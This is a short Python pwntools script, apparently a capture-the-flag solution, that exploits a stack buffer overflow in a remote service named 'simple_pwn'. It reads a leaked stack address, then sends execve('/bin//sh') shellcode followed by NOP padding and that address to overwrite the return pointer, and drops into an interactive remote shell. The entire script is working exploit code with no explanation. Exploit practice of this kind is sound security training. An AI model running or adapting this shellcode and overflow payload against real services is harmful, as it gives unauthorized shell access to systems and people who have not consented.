from pwn import *

e = ELF("./simple_pwn")
r = remote('3.35.102.104', 9696)

shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

print(r.recvuntil('\n'))
print(r.recvuntil(" : "))
buf = int(r.recv(14)[2:],16)


payload = ""
payload += shellcode
payload += "\x90"*(136 - len(shellcode))
payload += p64(buf)

r.sendline(payload)
r.interactive()

